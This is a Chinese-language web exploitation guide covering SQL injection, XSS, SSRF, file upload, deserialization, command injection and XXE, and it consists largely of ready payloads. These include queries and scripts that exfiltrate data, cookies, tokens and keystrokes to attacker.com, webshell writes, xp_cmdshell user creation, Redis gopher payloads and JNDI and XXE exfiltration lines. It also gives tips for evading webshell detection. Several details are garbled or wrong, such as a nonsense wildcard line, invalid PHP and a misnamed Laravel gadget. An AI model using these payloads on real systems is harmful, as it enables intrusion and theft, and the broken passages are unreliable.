# Web漏洞深入利用技术

> Web漏洞利用是渗透测试的核心技能。本文档系统讲解SQL注入、XSS、SSRF、文件上传、反序列化等漏洞的深入利用技术，侧重原理分析与实战思路。

---

## 一、SQL注入深入利用

### 1.1 盲注优化技术

当注入点无直接回显时，需采用盲注技术逐步提取数据。

**布尔盲注 — 二分法优化**

传统盲注逐字符比较效率极低。二分法利用 ASCII 码的有序性，将每个字符的猜测从最多 128 次缩减至最多 7 次：

```
原理：通过比较 ASCII 值大小，每次将搜索空间减半

payload 示例（布尔条件）:
AND ASCII(SUBSTRING((SELECT user()),1,1)) > 64  -- 判断首字符是否 > 64
AND ASCII(SUBSTRING((SELECT user()),1,1)) > 96  -- 进一步缩小
AND ASCII(SUBSTRING((SELECT user()),1,1)) > 112 -- 继续二分
-- 最终定位到 'r' (ASCII 114)，即 root 的首字母
```

**时间盲注 — 延时注入**

当布尔条件无法通过页面差异判断时，利用数据库延时函数制造可观测的时间差：

| 数据库 | 延时函数 | 条件判断方式 |
|--------|----------|-------------|
| MySQL | `SLEEP(5)` | `IF(condition, SLEEP(5), 0)` |
| PostgreSQL | `pg_sleep(5)` | `CASE WHEN condition THEN pg_sleep(5) END` |
| MSSQL | `WAITFOR DELAY '0:0:5'` | `IF condition WAITFOR DELAY '0:0:5'` |
| Oracle | `DBMS_LOCK.sleep(5)` | 需要权限，可用 `DECODE` 配合重查询 |

时间盲注的关键挑战是网络抖动干扰。实践中应设置大于网络基线延迟的阈值（通常 3-5 秒），并多次取平均值以降低误判。

**DNS外带盲注（OOB）**

当布尔和时间盲注均不稳定时，可利用数据库的 DNS 查询功能将数据外带到攻击者控制的域名服务器：

```
MySQL (需 secure_file_priv 配置允许):
SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT user()), '.attacker.com\\test'))

MSSQL:
EXEC master..xp_dirtree '\\' + (SELECT TOP 1 password FROM users) + '.attacker.com\test'

Oracle:
SELECT UTL_HTTP.REQUEST('http://'||(SELECT user FROM dual)||'.attacker.com/') FROM dual
```

攻击者在 `attacker.com` 的 DNS 服务器上配置日志记录，即可通过 DNS 查询日志中的子域名获取数据库内容。

### 1.2 多数据库差异利用

不同数据库的语法差异直接影响利用方式：

```
信息获取对比:
MySQL:    SELECT version()              -- 5.7.29-log
MSSQL:    SELECT @@version              -- Microsoft SQL Server 2019
Oracle:   SELECT banner FROM v$version  -- Oracle Database 19c
PostgreSQL: SELECT version()            -- PostgreSQL 12.2

拼接函数对比:
MySQL:       CONCAT(a, b) / GROUP_CONCAT(col SEPARATOR ',')
MSSQL:       a + b / STRING_AGG(col, ',') (2017+)
Oracle:      a || b / LISTAGG(col, ',') WITHIN GROUP (ORDER BY col)
PostgreSQL:  a || b / STRING_AGG(col, ',')

注释语法对比:
MySQL:       -- / # / /* */
MSSQL:       -- / /* */
Oracle:      -- / /* */
PostgreSQL:  -- / /* */
```

### 1.3 文件读写与命令执行

**MySQL 文件读写**

```sql
-- 读取文件（需 FILE 权限 + secure_file_priv 未设为 NULL）
SELECT LOAD_FILE('/etc/passwd')
SELECT LOAD_FILE('C:/Windows/win.ini')

-- 写入 Webshell
SELECT '<?php eval($_POST["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php'
SELECT '<?php eval($_POST["cmd"]);?>' INTO DUMPFILE '/var/www/html/shell.php'

-- 写入条件: FILE 权限 + secure_file_priv 为空或指定路径 + web 可写目录
```

`secure_file_priv` 参数是关键限制：
- 为空字符串：允许写入任意路径
- 为某路径：只能写入该路径
- 为 NULL：禁止所有文件操作

**MSSQL xp_cmdshell**

```sql
-- 启用 xp_cmdshell（需 sa 权限）
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- 执行系统命令
EXEC xp_cmdshell 'whoami'
EXEC xp_cmdshell 'net user hacker P@ss123 /add'
```

若 `xp_cmdshell` 被禁用，可尝试利用 `sp_OACreate`（OLE Automation Procedures）替代。

### 1.4 WAF绕过技术

**内联注释绕过**

MySQL 支持在注释内执行语句：

```sql
UNION/**/SELECT/**/1,2,3                      -- 空注释分割
UNION/*!50000SELECT*/ 1,2,3                   -- MySQL 版本条件注释
/*!50000UNION*//*!50000SELECT*/ 1,2,3          -- 绕过关键字过滤
```

**大小写混合**

```sql
UnIoN SeLeCt 1,2,3
sElEcT @@version
```

**编码绕过**

| 编码方式 | 示例 | 适用场景 |
|----------|------|----------|
| URL编码 | `UNION` → `%55NION` | URL参数 |
| 双重URL编码 | `%2555NION` | 过WAF多次解码 |
| Hex编码 | `0x756E696F6E` | 字符串比较 |
| Unicode编码 | `%u0055NION` | IIS环境 |

**分块传输编码**

利用 HTTP/1.1 的 Transfer-Encoding: chunked 绕过基于请求体的 WAF 检测：

```
POST /inject.php HTTP/1.1
Transfer-Encoding: chunked

5
id=1
4
UNIO
3
N S
3
EL
3
ECT
1
&
0

```

### 1.5 UDF提权

用户自定义函数（UDF）是 MySQL 扩展功能的机制。攻击者在获取 MySQL root 权限后，可加载自定义动态链接库执行系统命令：

```
利用条件:
1. MySQL root 权限
2. secure_file_priv 允许写入
3. plugin 目录可写（或利用目录遍历漏洞）

利用流程:
1. 将 UDF 动态库（.so/.dll）通过 LOAD_FILE + INTO DUMPFILE 写入 plugin 目录
2. 使用 CREATE FUNCTION 创建自定义函数
3. 调用自定义函数执行系统命令

关键语句:
CREATE FUNCTION sys_eval RETURNS string SONAME 'udf.so';
SELECT sys_eval('whoami');
```

UDF 提权的核心限制在于 plugin 目录的写入权限。MySQL 5.1+ 限制了可加载路径，需写入 `lib/plugin/` 目录下。

### 1.6 SQLMap高级用法

SQLMap 自动化了大部分注入利用流程，其高级参数可应对复杂场景：

```
--os-shell          获取操作系统 Shell（通过写入 Webshell + 命令执行）
--os-pwn            获取反弹 Shell（配合 Metasploit）
--tamper            指定绕过脚本（如 tamper=space2comment,between）
--second-url        二阶注入利用（注入点与回显不在同一页面）
--dns-domain        DNS 外带盲注（需配合 DNS 服务器）
--file-read         读取目标文件
--file-write/--file-dest    上传文件到目标
--technique         指定注入技术（B/E/U/S/T/Q 对应布尔/报错/联合/堆叠/时间/内联查询）
--batch             非交互模式，使用默认参数
--level/--risk      提高检测覆盖面和风险等级（level=5 risk=3 最全面）
```

常用 tamper 脚本组合：
- `space2comment`：空格替换为内联注释
- `between`：`>` 替换为 `BETWEEN`
- `randomcase`：随机大小写
- `charunicodeencode`：Unicode 编码
- `charencode`：URL 编码

---

## 二、XSS深入利用

### 2.1 存储型XSS实战场景

存储型 XSS 是危害最大的 XSS 类型， payload 持久化存储于服务端，影响所有访问该页面的用户。

**典型场景分析**

```
场景1：论坛/评论区
- 注入点：帖子正文或评论内容
- 存储位置：数据库
- 触发条件：其他用户浏览该帖子
- 危害：自动传播型蠕虫 XSS

场景2：用户资料页
- 注入点：昵称/签名/个人简介字段
- 存储位置：用户表
- 触发条件：管理员查看用户列表
- 危害：精准打击管理员账户

场景3：消息通知系统
- 注入点：私信标题或内容
- 存储位置：消息表
- 触发条件：接收者打开消息
- 危害：针对性攻击特定用户
```

### 2.2 DOM型XSS挖掘与利用

DOM 型 XSS 不经过服务端处理，完全在客户端 JavaScript 执行。挖掘核心是追踪**污点源到汇聚点**的数据流。

**常见污点源（Source）**

```javascript
location.hash          // URL 锚点
location.search        // 查询参数
document.referrer      // 来源 URL
document.cookie        // Cookie
window.name            // 窗口名称
postMessage            // 跨域消息
```

**常见汇聚点（Sink）**

```javascript
element.innerHTML      // HTML 注入
element.outerHTML
document.write()
eval()
setTimeout("string")  // 字符串参数执行
setInterval("string")
element.setAttribute('onclick', payload) // 事件属性
```

**挖掘流程**

1. 审计 JavaScript 代码中所有读取污点源的位置
2. 追踪数据流向，检查是否经过过滤
3. 确认数据最终是否到达汇聚点
4. 检查过滤函数是否可绕过

```
示例漏洞代码:
<script>
  var content = location.hash.substring(1);  // 污点源
  document.getElementById('output').innerHTML = unescape(content);  // 汇聚点（无过滤）
</script>

利用 payload:
http://target.com/page#<img src=x onerror=alert(document.cookie)>
```

### 2.3 XSS数据窃取

**Cookie窃取**

```javascript
// 基础 Cookie 窃取
new Image().src = 'https://attacker.com/log?c=' + document.cookie;

// 带 HttpOnly 绕过思路（需配合其他漏洞）:
// 若存在 CORS 配置错误或 PHPSESSID 通过 JS 可读，
// 可通过读取响应头获取 Set-Cookie
```

**LocalStorage / SessionStorage 窃取**

```javascript
// 窃取 LocalStorage 中存储的 Token
var token = localStorage.getItem('access_token');
new Image().src = 'https://attacker.com/log?t=' + encodeURIComponent(token);
```

**键盘记录器**

```javascript
// 简易键盘记录 payload
document.onkeypress = function() {
  var data = String.fromCharCode(window.event.keyCode);
  new Image().src = 'https://attacker.com/log?k=' + encodeURIComponent(data);
};
```

### 2.4 XSS Beacons（浏览器Botnet概念）

XSS Beacons 是指通过存储型 XSS 在目标用户的浏览器中植入持久化的"信标"脚本，使攻击者能够远程控制受害者的浏览器执行操作。

```
Beacon 功能概念:
├── 持久化：利用存储型 XSS 在页面中植入 JS，每次用户访问都重新加载
├── 命令分发：定时向 C2 服务器请求指令并执行
├── 内网代理：利用受害者浏览器作为跳板访问内网资源（同源策略保护下）
├── 信息收集：收集受害者浏览器指纹、局域网信息
└── 传播：蠕虫式自动传播 payload
```

### 2.5 XSS WAF绕过技术

**编码绕过**

```javascript
// HTML 实体编码
<img src=x onerror=alert(1)>       -- 原始
<img src=x onerror=&#97;lert(1)>   -- 十进制 HTML 实体
<img src=x onerror=&#x61;lert(1)>  -- 十六进制 HTML 实体

// JavaScript 编码
eval('\x61lert(1)')     -- 十六进制
eval('\u0061lert(1)')   -- Unicode 编码
eval(atob('YWxlcnQoMSk='))  -- Base64 解码
```

**标签混淆**

```javascript
<script>/*..*/alert(1)/*..*/</script>      -- 注释混淆
<svg/onload=alert(1)>                       -- SVG 标签
<details/open/ontoggle=alert(1)>            -- details 标签
<body/onload=alert(1)>                      -- body 标签
<input/onfocus=alert(1) autofocus>          -- input 标签
<select/onfocus=alert(1) autofocus>         -- select 标签
```

**事件处理器绕过**

```javascript
// 利用不常见事件处理器绕过黑名单
<img src=x onerror=alert(1)>              -- 常见
<img src=x ONERROR=alert(1)>              -- 大小写
<img src=x onerror =alert(1)>             -- 空格
<img src=x onerror/**/=alert(1)>           -- 注释
<img src=x onerror=/**/alert(1)>           -- 注释
```

### 2.6 CSP绕过技术

内容安全策略（CSP）是 XSS 防御的重要机制，但存在多种绕过方式：

| CSP 规则 | 绕过思路 |
|----------|----------|
| `script-src 'self'` | 上传 JS 文件到同源路径 |
| `script-src 'unsafe-inline'` | 直接内联执行 |
| `script-src 'nonce-xxx'` | 利用 DOM XSS 注入带 nonce 的 script 标签 |
| `script-src 'unsafe-eval'` | 利用 `eval()` / `Function()` |
| 包含受信任 CDN | 利用 CDN 上的 AngularJS 等框架绕过 |
| `script-src 'self' *.google.com` | 利用 google.com 域上的 JSONP 回调 |

**AngularJS CSP 绕过示例思路**

若 CSP 允许加载受信任域的脚本，且目标加载了 AngularJS：

```javascript
// AngularJS 的 Client-Side Template Injection 可绕过 CSP
// 原理：AngularJS 在客户端编译模板时执行表达式
<div ng-app>
  <div ng-csp>
    {{$eval.constructor('alert(1)')()}}
  </div>
</div>
```

### 2.7 XSS平台搭建与使用

XSS平台用于管理 XSS payload 和接收窃取的数据。自建平台核心组件包括：

```
XSS Platform 架构:
├── Payload 生成模块
│   ├── 通用 Cookie 窃取
│   ├── 键盘记录
│   ├── 页面截图
│   ├── 表单劫持
│   └── 内网信息探测
├── 数据接收模块
│   ├── 记录接口（接收被盗数据）
│   ├── 防重放去重
│   └── 数据分类存储
├── 管理后台
│   ├── 项目管理（不同目标不同项目）
│   ├── Payload 管理（生成/查看/删除）
│   ├── 数据查看
│   └── 统计分析
└── 安全防护
    ├── 平台自身防护
    └── 通信加密
```

---

## 三、SSRF深入利用

### 3.1 SSRF利用场景

**内网端口扫描**

```
通过 SSRF 探测内网服务:
http://target.com/proxy?url=http://127.0.0.1:6379/
http://target.com/proxy?url=http://192.168.1.1:80/
http://target.com/proxy?url=http://10.0.0.1:3306/

判断方式:
- 端口开放: 返回正常响应或特定错误信息（如协议错误）
- 端口关闭: 连接超时或拒绝连接
- 响应时间差异: 开放端口响应快，关闭端口响应慢
```

**内网服务指纹识别**

不同服务在 HTTP 请求下返回不同的错误信息或 Banner：

```
Redis (6379):    -ERR wrong number of arguments
MySQL (3306):    返回特定版本握手包（非 HTTP）
FTP (21):        220 服务 Banner
SSH (22):        SSH-2.0-OpenSSH 协议标识
Memcached (11211): 非协议响应
```

**攻击内网Redis**

Redis 未授权访问是 SSRF 最常见的利用目标：

```
利用 gopher 协议发送 Redis 命令:
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$payload_len%0d%0a$payload%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$dir_len%0d%0a$dir%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$file_len%0d%0a$file%0d%0a*1%0d%0a$4%0d%0asave%0d%0a

利用方式:
1. 写入 Webshell 到 Web 目录（需知道路径）
2. 写入 SSH 公钥到 /root/.ssh/authorized_keys
3. 写入计划任务执行反弹 Shell
```

**云元数据接口**

云环境的元数据接口是 SSRF 的高价值目标：

```
AWS EC2 元数据 (169.254.169.254):
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
→ 可获取 IAM 临时凭证（AccessKey/SecretKey/Token）

GCP 元数据:
http://metadata.google.internal/computeMetadata/v1/
→ 需添加 Header: Metadata-Flavor: Google

Azure 元数据:
http://169.254.169.254/metadata/instance?api-version=2021-02-01
→ 需添加 Header: Metadata: true

阿里云:
http://100.100.100.200/latest/meta-data/
```

**gopher协议攻击内网**

gopher 协议可发送任意 TCP 数据包，是 SSRF 利用中最强大的协议：

```
gopher 协议格式:
gopher://target:port/_数据流（URL编码）

支持的攻击:
- gopher → Redis: 写文件/写公钥/写计划任务
- gopher → MySQL: 执行 SQL 语句（需知道用户名和加密握手）
- gopher → FastCGI: 利用未授权 FastCGI 执行 PHP 代码
- gopher → SMTP: 发送邮件/伪造发件人
```

### 3.2 SSRF绕过技术

**DNS Rebinding**

利用 DNS 解析的时间差，使服务端两次 DNS 查询解析到不同 IP：

```
攻击原理:
1. 攻击者注册域名 rebinding.attacker.com
2. 设置 DNS 服务器，第一次解析返回攻击者服务器 IP（通过校验）
3. 第二次解析返回 127.0.0.1（实际请求目标）
4. 服务端在两次 DNS 查询间未缓存或缓存时间极短

防御: 校验后立即请求、固定 IP 连接、DNS 缓存
```

**302跳转绕过**

利用受信任域名的 302 跳转功能跳转到内网地址：

```
攻击流程:
1. SSRF 校验白名单允许 target.com
2. target.com/redirect?url=http://127.0.0.1 返回 302 跳转
3. 服务端跟随跳转到 127.0.0.1

利用短网址服务的 302 跳转:
http://target.com/proxy?url=https://bit.ly/xxxxx
→ 302 → http://127.0.0.1:6379/
```

**URL编码与变形**

```
127.0.0.1 的多种表示:
http://127.0.0.1/
http://0x7f000001/          -- 十六进制
http://2130706433/          -- 十进制整数
http://017700000001/        -- 八进制
http://0177.00.00.01/       -- 混合八进制
http://[::1]/               -- IPv6 回环
http://0:0:0:0:0:0:0:1/    -- IPv6 完整形式
http://[::ffff:127.0.0.1]/  -- IPv4-mapped IPv6
http://127.1/               -- 简写
http://127.0.0.1.nip.io/   -- DNS 泛解析
```

### 3.3 SSRF漏洞链设计

```
SSRF → Redis → Shell 漏洞链:

步骤1: 发现 SSRF 漏洞
  http://target.com/proxy?url=http://attacker.com/

步骤2: 利用 SSRF 探测内网
  http://target.com/proxy?url=http://192.168.1.0/24  → 端口扫描

步骤3: 发现内网 Redis 未授权
  http://target.com/proxy?url=http://192.168.1.100:6379/
  → 返回 -ERR 或特定响应

步骤4: 利用 gopher 协议向 Redis 发送命令
  http://target.com/proxy?url=gopher://192.168.1.100:6379/_(Redis命令)
  → 写入 Webshell / SSH 公钥 / 计划任务

步骤5: 获取 Shell
  → 通过 Webshell 或 SSH 或计划任务反弹 Shell
```

---

## 四、文件上传深入利用

### 4.1 绕过前端校验

前端校验仅基于浏览器 JavaScript，可通过直接构造请求绕过：

```javascript
// 常见前端校验方式及绕过:
// 1. JavaScript 检查后缀 → 禁用 JS / 修改请求 / 使用 BurpSuite
// 2. MIME 类型前端检查 → 修改 Content-Type
// 3. 文件头检查 → 修改文件头

// 绕过方法:
// - 使用 BurpSuite 拦截请求修改文件名和 Content-Type
// - 直接构造 POST 请求绕过前端校验
// - 利用浏览器开发者工具修改校验函数
```

### 4.2 绕过Content-Type校验

服务端校验 Content-Type 但未校验文件内容时：

```
原始请求:
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php    ← 被拦截

修改后:
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg           ← 绕过（需服务端只校验 Content-Type）
```

### 4.3 绕过后缀校验

**双写绕过**

```
shell.pphphp     → 过滤 php 后变为 shell.php
shell.phphpp     → 不同过滤逻辑可能不同
```

**解析漏洞利用**

| 中间件 | 漏洞 | 利用方式 |
|--------|------|----------|
| Apache | 未知后缀解析 | `shell.php.xxx` → Apache 无法识别 .xxx，向前解析为 PHP |
| Apache | 换行解析 | `shell.php\n.jpg` → 认为是 PHP |
| Nginx | 路径解析 | `shell.jpg/x.php` → PHP 解析 shell.jpg |
| Nginx | 空字节 | `shell.jpg%00.php` → 截断为 PHP |
| IIS 6.0 | 目录解析 | `shell.asp/1.jpg` → ASP 解析 |
| IIS 6.0 | 分号截断 | `shell.asp;.jpg` → ASP 解析 |
| IIS 7.0/7.5 | CGI 路径解析 | `shell.jpg/.php` → PHP 解析 |

**.htaccess 绕过**

Apache 下若允许上传 .htaccess 文件：

```apache
# .htaccess 内容
AddType application/x-httpd-php .jpg
# 使所有 .jpg 文件被当作 PHP 执行

# 或:
<FilesMatch "shell">
SetHandler application/x-httpd-php
</FilesMatch>
```

**MIME 绕过**

服务端使用 `getimagesize()` 或 `finfo` 检测文件类型时，构造合法图片头：

```
GIF89a 文件头 + PHP 内容:
GIF89a
<?php eval($_POST['cmd']);?>

→ getimagesize() 识别为 GIF
→ 若服务端仅校验文件类型不校验内容则绕过
```

### 4.4 绕过内容校验

**图片马制作**

```bash
# 合并正常图片与 PHP 代码
cat normal.jpg >> shell.php      # 图片在前
cat shell.php >> normal.jpg      # 或代码在后
# 利用: 需配合文件包含漏洞或解析漏洞才能执行
```

**GIF89a 头绕过**

```
文件内容:
GIF89a
<?php @eval($_POST['cmd']);?>

最小 GIF 头: GIF89a (6 字节)
最小 PNG 头: \x89PNG\r\n\x1a\n (8 字节)
最小 JPEG 头: \xFF\xD8\xFF (3 字节)
```

### 4.5 条件竞争上传

利用服务端先保存后删除的时间差，在高并发下访问已上传但未被删除的文件：

```
竞争上传原理:
1. 服务端逻辑: 接收文件 → 保存到临时目录 → 安全检查 → 删除/移动
2. 攻击者: 持续上传文件 + 持续访问临时文件路径
3. 在"保存"到"删除"的窗口期内成功访问到文件

利用流程:
- 上传脚本持续 POST 上传 PHP 文件
- 访问脚本持续 GET 访问临时路径
- 上传的 PHP 文件内容: 在被执行时生成一个持久 Webshell

<?php
file_put_contents('permanent_shell.php', '<?php eval($_POST["cmd"]);?>');
?>
```

### 4.6 Webshell管理工具特征与规避

| 工具 | 流量特征 | 规避思路 |
|------|----------|----------|
| 蚁剑 (AntSword) | 请求体 Base64 编码 + 特定参数名 | 自定义编码器/加密传输 |
| 冰蝎 (Behinder) | 固定密钥 AES 加密 + 特定 Content-Type | 修改默认密钥 + 修改请求特征 |
| 哥斯拉 (Godzilla | 固定 Cookie + 特定加密格式 | 修改默认配置 + 自定义载荷 |

规避检测核心思路：
- 加密通信流量（AES/自定义加密）
- 去除默认特征参数名和固定 Cookie
- 模拟正常业务请求频率和格式
- 使用 WebSocket 等非标准通道

---

## 五、反序列化漏洞深入

### 5.1 PHP反序列化POP链构造

**魔术方法利用链**

PHP 反序列化利用的核心是魔术方法（Magic Methods）的自动调用特性：

```
魔术方法调用顺序（常见利用链）:
__wakeup()      → 反序列化时自动调用
__destruct()    → 对象销毁时调用
__toString()    → 对象被当作字符串时调用
__call()        → 调用不存在的方法时调用
__get()         → 访问不存在/私有属性时调用
__set()         → 设置不存在/私有属性时调用
__invoke()      → 对象作为函数调用时

典型 POP 链构造:
__wakeup() → __destruct() → __toString() → __call() → __invoke() → 目标函数
```

**POP 链构造流程**

```
步骤1: 识别入口（unserialize 调用点）
步骤2: 搜索所有 __wakeup / __destruct 方法
步骤3: 追踪方法内的属性调用，寻找 __toString / __call / __get 等触发点
步骤4: 构造属性类型，使数据流通过魔术方法链传导
步骤5: 最终到达 eval / system / include 等危险函数
```

**phar协议触发反序列化**

phar 文件的反序列化无需 `unserialize()` 函数，通过文件操作函数即可触发：

```php
// phar 文件在 metadata 中存储序列化对象
// 以下函数操作 phar 文件时会触发反序列化:
file_get_contents('phar://evil.phar')
file_exists('phar://evil.phar')
is_file('phar://evil.phar')
fopen('phar://evil.phar')
getimagesize('phar://evil.phar')  // 绕过文件上传限制
// 以及更多文件操作函数

// 利用条件: phar.readonly = Off（PHP 8.0 之前默认开启）
```

**常见框架反序列化**

```
ThinkPHP 反序列化:
- 利用链入口: think\process\Serialize 类
- 利用 __destruct → toJson → toArray → 链式调用最终触发代码执行
- 影响版本: ThinkPHP 5.0.x / 5.1.x

Laravel 反序列化:
- 利用链入口: PendingRootos
- 利用 __destruct → 调用核心方法触发 RCE
- 影响版本: Laravel 5.x / 6.x / 7.x / 8.x
```

### 5.2 Java反序列化

**CommonsCollections利用链分析**

Apache Commons Collections 是最经典的 Java 反序列化利用链来源：

```
CommonsCollections 利用链分类:
CC1 (LazyMap + InvocationHandler)
  → AnnotationInvocationHandler 触发 LazyMap.get()
  → ChainedTransformer 触发反射调用链
  → 最终调用 Runtime.exec()

CC6 (HashSet + TiedMapEntry)
  → HashSet.readObject() → TiedMapEntry.hashCode()
  → LazyMap.get() → ChainedTransformer

CC7 (Hashtable + LazyMap)
  → Hashtable.readObject() → LazyMap.get()

关键组件: InvokerTransformer / ChainedTransformer / ConstantTransformer
核心原理: 通过 Transformer 链式调用实现反射执行任意方法
```

利用条件：目标应用类路径中存在 CommonsCollections 组件。

**Fastjson / Jackson反序列化**

```
Fastjson 反序列化原理:
- Fastjson 通过 @type 字段指定反序列化类
- 通过 setter 方法或字段实现属性注入
- 利用 JDBC RowSetImpl 配合 JNDI 注入:
  {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}

Jackson 反序列化:
- 启用 enableDefaultTyping 后存在类似利用
- 利用类: JdbcRowSetImpl / TemplatesImpl
```

**Shiro反序列化**

```
Apache Shiro rememberMe 反序列化原理:
1. Shiro 使用 AES-CBC 加密 rememberMe Cookie
2. 密钥硬编码为固定值 (kPH+bIxk5D2deZiIxcaaaA==)
3. 服务端解密后进行反序列化

利用流程:
1. 使用已知密钥加密序列化的利用链 payload
2. 将加密后的数据作为 rememberMe Cookie 发送
3. 服务端解密反序列化触发 RCE

防御: 更换默认密钥 / 升级 Shiro 版本 / 使用自定义密钥
```

### 5.3 Python反序列化

```python
# pickle 反序列化原理
# pickle 通过 __reduce__ 方法指定反序列化时执行的代码
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

# 序列化后的数据在 pickle.loads() 时触发 __reduce__
payload = pickle.dumps(Exploit())

# PyYAML 反序列化
# yaml.load(data) 默认使用 yaml.Loader 可执行任意 Python 代码
# yaml.load("!!python/object/apply:os.system ['id']")

# 安全实践: 使用 yaml.safe_load() 替代 yaml.load()
```

---

## 六、命令执行/代码执行深入

### 6.1 命令注入绕过

**空格绕过**

```bash
# 当空格被过滤时:
cat${IFS}/etc/passwd          # 使用环境变量 $IFS
cat$IFS/etc/passwd
{cat,/etc/passwd}              # 使用大括号
cat</etc/passwd               # 使用重定向
X=$'cat\x20/etc/passwd'&&$X   # 使用变量
```

**关键字绕过**

```bash
# 当 cat / flag 等关键字被过滤:
ca\t /etc/passwd               # 反斜杠拼接
ca''t /etc/passwd              # 单引号拼接
ca""t /etc/passwd              # 双引号拼接
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash   # Base64 解码执行

# 变量拼接
a=ca;b=t;$a$b /etc/passwd
```

**通配符绕过**

```bash
# 利用通配符匹配文件名:
/bin/cat /etc/passwd → /???/??t /???/??????
/bin/c?at /etc/pa??wd

# 利用 ? 和 * 匹配路径:
/power?r ?d?ear ?ean?ear
```

### 6.2 Linux/Windows命令注入差异

| 特性 | Linux | Windows |
|------|-------|---------|
| 命令连接符 | `;` `&&` `\|\|` | `&` `&&` `\|\|` |
| 换行执行 | `\n` | `%0a` / `%0d%0a` |
| 反引号执行 | `` `command` `` | 不支持 |
| 子 Shell | `$(command)` | 不支持 |
| 通配符 | `?` `*` `[...]` | `?` `*`（有限） |
| 空格替代 | `$IFS` `{}` `<` | `%09` (Tab) |

### 6.3 无字母数字Webshell

利用 PHP 动态特性，在过滤所有字母和数字的情况下执行代码：

```php
<?php
// 原理: 利用位运算和自增运算构造字符
// $_ = [] → Array
// $_ = @$_[""] → （访问不存在的键返回 NULL）
// $_ = $_['!' == false] → 'A' (Array[1])
// 通过自增构造任意字母

// 简化示例思路:
$_ = [];
$_ = @$_[""];
$_ = @$_['!' == $_];  // 获取 'A'
$__ = $_;              // 'A'
$__++; $__++; ...      // 通过自增获取其他字母
// 最终拼凑出函数名和参数

// 实际利用示例（教育演示）:
$__() = $$_{$_}{$_}();  // 构造系统调用
```

### 6.4 一句话原理

```php
// PHP 一句话
<?php @eval($_POST['cmd']); ?>
// 原理: eval() 执行 POST 参数 cmd 中的 PHP 代码
// @ 抑制错误输出

// Perl 一句话
#!/usr/bin/perl
eval $ENV{HTTP_CMD};
// 原理: 从环境变量读取并执行代码

// Python 一句话
import os; os.system(__import__('sys').argv[1])
// 原理: 从命令行参数获取命令并执行
```

---

## 七、XXE漏洞深入

### 7.1 XXE基础回顾

XXE（XML外部实体注入）利用 XML 解析器处理外部实体的特性：

```xml
<!-- 基础 XXE 读取文件 -->
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<test>&xxe;</test>

<!-- 利用原理: XML 解析器在处理 DTD 时加载外部实体 -->
<!-- 有回显: 直接在响应中看到文件内容 -->
```

### 7.2 Blind XXE（OOB外带数据）

当 XXE 无直接回显时，利用外部 DTD + HTTP 请求外带数据：

```xml
<!-- payload.xml -->
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % ext SYSTEM "http://attacker.com/evil.dtd">
  %ext;
]>
<data>&send;</data>

<!-- attacker.com/evil.dtd -->
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/log?d=%file;'>">
%all;

<!-- 数据流: 读取文件 → URL 编码 → HTTP 请求外带 → DNS/HTTP 日志 -->
```

利用 `php://filter` 协议可处理读取内容中的特殊字符：

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

### 7.3 XXE多场景利用

```
XXE 利用场景:
├── 读取文件: file:///etc/passwd / file:///C:/Windows/win.ini
├── SSRF: http://internal-service:port/
├── 内网端口扫描: http://192.168.1.1:PORT/ (通过响应/时间判断)
├── DoS: Billion Laughs 攻击（递归实体膨胀）
│   <!ENTITY lol "lol">
│   <!ENTITY lol2 "&lol;&lol;..."> (递归扩展消耗内存)
└── 命令执行: PHP expect:// 协议（需安装 expect 扩展）
```

### 7.4 SVG XXE

SVG 文件本身是 XML 格式，在支持 SVG 上传和渲染的场景中可触发 XXE：

```xml
<!-- malicious.svg -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
  <text x="10" y="20">&xxe;</text>
</svg>

<!-- 利用场景: 文件上传 SVG → 服务端解析 SVG → 触发 XXE -->
```

---

## 八、Web漏洞利用链设计思路

### 8.1 漏洞链设计方法论

漏洞利用链的核心是将多个独立漏洞组合，实现单个漏洞无法达到的目标：

```
利用链设计流程:
1. 信息泄露 → 获取敏感信息（源码/密钥/配置/内部路径）
2. 信息收集 → 分析获取的信息，发现新的攻击面
3. 漏洞组合 → 将信息泄露漏洞与执行类漏洞结合
4. 权限提升 → 从低权限提升到高权限
5. 横向移动 → 利用已获取的权限攻击内网其他系统
6. 持久化 → 建立持久化访问通道
```

### 8.2 常见漏洞组合

```
组合1: SSRF + Redis + Shell
  SSRF → 内网端口扫描 → 发现 Redis 未授权
  → gopher 协议写计划任务/SSH公钥 → 获取 Shell

组合2: 反序列化 + JNDI + RCE
  Fastjson/Jackson 反序列化 → JdbcRowSetImpl JNDI 注入
  → 恶意 LDAP/RMI 服务返回恶意 Reference
  → 目标加载并执行恶意类 → RCE

组合3: 文件上传 + 文件包含 + Webshell
  绕过文件上传 → 上传图片马 → 文件包含漏洞触发执行
  → 获取 Webshell → 提权

组合4: XXE + SSRF + 云元数据
  XXE 读取配置文件 → 获取内部 API 地址
  → SSRF 访问云元数据 → 获取 IAM 临时凭证
  → 利用云凭证操作云资源

组合5: XSS + CSRF + 功能利用
  存储型 XSS → 受害者访问触发
  → 构造 CSRF 请求修改管理员密码/添加用户
  → 获取管理员权限 → 进一步渗透
```

